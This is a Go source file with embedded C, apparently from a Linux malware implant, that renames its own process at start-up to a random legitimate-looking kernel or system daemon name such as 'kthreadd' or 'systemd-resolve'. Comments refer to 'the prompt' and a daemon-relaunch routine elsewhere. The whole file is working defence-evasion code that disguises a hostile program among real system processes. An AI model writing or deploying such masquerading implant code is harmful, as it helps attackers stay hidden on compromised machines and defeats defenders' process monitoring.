// implant/procname_linux.go
//go:build linux

package main

/*
#include <stdlib.h>
#include <string.h>    // For strncpy
#include <unistd.h>
#include <sys/prctl.h> // For prctl
#include <time.h>      // For time() for srand

// PR_SET_NAME uses a buffer of TASK_COMM_LEN (usually 16) bytes, including the terminating null byte.
#define TASK_COMM_LEN 16

void setProcNameNative(const char* newname_orig) {
    char newname_truncated[TASK_COMM_LEN];
    strncpy(newname_truncated, newname_orig, TASK_COMM_LEN - 1);
    newname_truncated[TASK_COMM_LEN - 1] = '\0'; // Ensure null termination
    prctl(PR_SET_NAME, newname_truncated, 0, 0, 0);
}

void seedRand() {
	srand((unsigned int)time(NULL));
}
*/
import "C"
import (
	"unsafe" // For C.free
	// "time" // Go time package not directly needed here if C handles seeding
)

func init() {
	C.seedRand() // Seed the C random number generator

	randomizedPrctlName := generateLegitLookingName()
	csPrctlName := C.CString(randomizedPrctlName)
	defer C.free(unsafe.Pointer(csPrctlName)) // Free after C call

	C.setProcNameNative(csPrctlName) // Sets /proc/pid/comm

	// overwriteArgv(randomizedPrctlName) // This function is not effective as written
	// and not strictly needed if linuxRelaunchAsDaemon sets argv[0] correctly.
	// If it were to be used, it would need a CGo implementation to modify actual argv memory.
}

func generateLegitLookingName() string {
	// Ensure these are < 16 chars to fit PR_SET_NAME buffer
	names := []string{
		"kthreadd",
		"rcu_sched",
		"ksoftirqd/0",
		"kworker/u64:0",
		"migration/0",
		"watchdog/0",
		"events/0",
		"dbus-daemon",     // 11 chars
		"systemd-resolve", // 15 chars
		"gvfsd-fuse",      // 10 chars
		"anacron",         // 7 chars
	}
	return names[int(C.rand())%len(names)]
}

// The overwriteArgv function provided in the prompt does not correctly modify
// the process's command line arguments in a way that affects /proc/pid/cmdline.
// It modifies a Go slice copy. A true argv modification requires CGo or unsafe
// manipulation of the original argv memory region.
// Since linuxRelaunchAsDaemon now controls the arguments passed to execve,
// this function's original intent for /proc/pid/cmdline is covered.
/*
func overwriteArgv(newName string) {
	args := os.Args
	if len(args) == 0 {
		return
	}
	argv0 := []byte(args[0]) // This creates a *copy* of the string data
	newNameBytes := []byte(newName)
	copy(argv0, newNameBytes) // This modifies the local copy `argv0`
	if len(newNameBytes) < len(argv0) {
		for i := len(newNameBytes); i < len(argv0); i++ {
			argv0[i] = 0
		}
	}
	// To truly change os.Args[0] for the Go runtime:
	// if len(args) > 0 {
	//    os.Args[0] = newName // This changes what Go sees in os.Args[0]
	// }
	// But this doesn't change /proc/pid/cmdline after process start.
}
*/
